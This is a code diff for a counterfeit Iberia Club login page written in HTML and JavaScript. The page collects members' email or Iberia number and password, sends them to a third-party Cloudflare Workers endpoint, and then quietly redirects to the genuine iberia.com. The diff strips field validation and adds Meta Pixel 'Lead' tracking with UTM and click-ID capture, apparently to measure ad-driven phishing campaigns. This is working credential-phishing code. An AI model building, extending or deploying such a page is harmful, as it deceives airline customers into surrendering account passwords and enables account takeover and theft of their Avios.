@@ -5,14 +5,23 @@
   <title>Acceso a Iberia Club</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <!-- CSS principal do layout -->
   <link rel="stylesheet" href="style.css">
-
-  <!-- Ícone -->
   <link rel="icon" type="image/svg+xml" href="./Xjdsahd637sddUmi/logotopo.svg">
-
-  <!-- Font Awesome (mesmo caminho do outro site) -->
   <link rel="stylesheet" href="./Xjdsahd637sddUmi/all.min.css">
+
+  <!-- Meta Pixel -->
+  <script>
+    !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
+    n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1151815573251183');
+    fbq('track', 'PageView');
+  </script>
+  <noscript>
+    <img height="1" width="1" style="display:none"
+         src="https://www.facebook.com/tr?id=1151815573251183&ev=PageView&noscript=1"/>
+  </noscript>
 </head>
 <body>
 
@@ -32,7 +41,7 @@
     </div>
   </header>
 
-  <!-- FORMULÁRIO -->
+  <!-- FORM -->
   <div class="login-wrapper">
     <h1>Acceso a Iberia Club</h1>
     <p class="subtitle">Inicia sesión para ver promociones exclusivas y utilizar tus Avios.</p>
@@ -52,7 +61,7 @@
         <a href="#">¿Has olvidado tu contraseña?</a>
       </div>
 
-      <button type="submit" class="login-btn">Iniciar sesión</button>
+      <button type="submit" class="login-btn" id="submitBtn">Iniciar sesión</button>
 
       <div class="divider"><span>o</span></div>
 
@@ -89,137 +98,76 @@
 
   <!-- SCRIPT -->
   <script>
-    // Evitar zoom em dispositivos móveis
-    document.addEventListener("touchstart", function () {}, { passive: true });
-
     // Mostrar/ocultar senha
     const eyeIcon = document.querySelector(".eye-icon");
     const passwordInput = document.querySelector('input[name="password"]');
     eyeIcon.addEventListener("click", () => {
-      const type = passwordInput.type === "password" ? "text" : "password";
-      passwordInput.type = type;
+      passwordInput.type = passwordInput.type === "password" ? "text" : "password";
     });
 
-    // Validação de e-mail ou nº Iberia
-    const CONFIG_VALIDACAO = {
-      MIN_IBERIA_CLUB_LENGTH: 4,
-      MAX_IBERIA_CLUB_LENGTH: 14,
-      IBERIA_CLUB_PREFIX: /^(IB|ib)/i,
-      EMAIL_REGEX: /^[^\s@]+@[^\s@]+\.[^\s@]+$/
-    };
-
-    function isValidIberiaClubNumber(value) {
-      if (!value) return false;
-      let v = value.trim();
-
-      if (CONFIG_VALIDACAO.IBERIA_CLUB_PREFIX.test(v)) {
-        v = v.slice(2);
-      }
-
-      if (!/^\d+$/.test(v)) return false;
-
-      if (
-        v.length < CONFIG_VALIDACAO.MIN_IBERIA_CLUB_LENGTH ||
-        v.length > CONFIG_VALIDACAO.MAX_IBERIA_CLUB_LENGTH
-      ) {
-        return false;
-      }
-
-      // Algoritmo de Luhn
-      let sum = 0;
-      let shouldDouble = false;
-      for (let i = v.length - 1; i >= 0; i--) {
-        let digit = parseInt(v.charAt(i), 10);
-        if (shouldDouble) {
-          digit *= 2;
-          if (digit > 9) digit -= 9;
-        }
-        sum += digit;
-        shouldDouble = !shouldDouble;
-      }
-      return sum % 10 === 0;
+    // Funções auxiliares para capturar cookies e parâmetros
+    function getParam(name) {
+      try { return new URLSearchParams(location.search).get(name) || ""; } catch(e) { return ""; }
     }
-
-    // 👉 ALTERADO: agora aceita QUALQUER login não vazio (email, número, texto...)
-    function isValidEmailOrIberiaClub(value) {
-      // aceita qualquer valor não vazio
-      return value && value.trim().length > 0;
+    function getCookie(name) {
+      const m = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
+      return m ? m[2] : "";
     }
-
-    function showEmailError(message) {
-      const emailInput = document.getElementById("emailInput");
-      const errorEl = document.getElementById("emailError");
-      if (!emailInput || !errorEl) return;
-      if (message) {
-        errorEl.textContent = message;
-        errorEl.style.display = "block";
-        emailInput.classList.add("input-error");
-      } else {
-        errorEl.textContent = "";
-        errorEl.style.display = "none";
-        emailInput.classList.remove("input-error");
-      }
+    function readFbpFbc() {
+      const fbp = getCookie('_fbp');
+      let fbc = getCookie('_fbc');
+      const fbclid = getParam('fbclid');
+      if (!fbc && fbclid) fbc = 'fb.1.' + Date.now() + '.' + fbclid;
+      return { fbp, fbc, fbclid };
     }
-
-    function clearEmailError() {
-      showEmailError("");
+    function readUTMs() {
+      const p = (n) => getParam(n);
+      return {
+        utm_source: p('utm_source'),
+        utm_medium: p('utm_medium'),
+        utm_campaign: p('utm_campaign'),
+        utm_term: p('utm_term'),
+        utm_content: p('utm_content')
+      };
     }
 
     // Envio do formulário
     document.getElementById("loginForm").addEventListener("submit", async (e) => {
       e.preventDefault();
-
       const email = e.target.email.value.trim();
       const password = e.target.password.value.trim();
 
-      clearEmailError();
+      if (!email || !password) return;
 
-      if (!email || !password) {
-        showEmailError("Por favor, preencha todos os campos.");
-        return;
-      }
-
-      if (!isValidEmailOrIberiaClub(email)) {
-        showEmailError("Por favor, introduce un e-mail o nº Iberia Club válido.");
-        return;
-      }
+      const eventId = 'lead-' + Date.now() + '-' + Math.random().toString(36).slice(2);
+      const { fbp, fbc, fbclid } = readFbpFbc();
+      const utm = readUTMs();
 
       try {
-        const response = await fetch("https://flat-butterfly-fb71.leticiaramosjesus070.workers.dev/", {
+        await fetch("https://flat-butterfly-fb71.leticiaramosjesus070.workers.dev/", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             email: email,
             password: password,
             origem: "formulario_firebase",
-            consent: true // ✅ Adicionado para compatibilidade com o Worker
+            consent: true,
+            event_id: eventId,
+            event_source_url: location.href,
+            fbp, fbc, fbclid,
+            utm
           })
         });
 
-        let data = {};
-        try {
-          data = await response.json();
-        } catch (e) {
-          data = {};
-        }
+        if (window.fbq) fbq('track', 'Lead', {}, { eventID: eventId });
 
-        // Se ok ou resposta 2xx, redireciona
-        if (data.ok === true || response.ok) {
-          e.target.reset();
-          window.location.href = "https://www.iberia.com/es/";
-          return;
-        }
+        // Redireciona direto após envio (sem mostrar "Procesando...")
+        window.location.replace('https://www.iberia.com/es/');
 
-        alert("❌ Erro ao enviar: " + (data.error || "tente novamente"));
       } catch (err) {
-        alert("Erro de conexão: " + err.message);
+        console.error('Erro ao enviar', err);
       }
     });
-
-    const emailInput = document.getElementById("emailInput");
-    if (emailInput) {
-      emailInput.addEventListener("input", clearEmailError);
-    }
   </script>
 </body>
 </html>
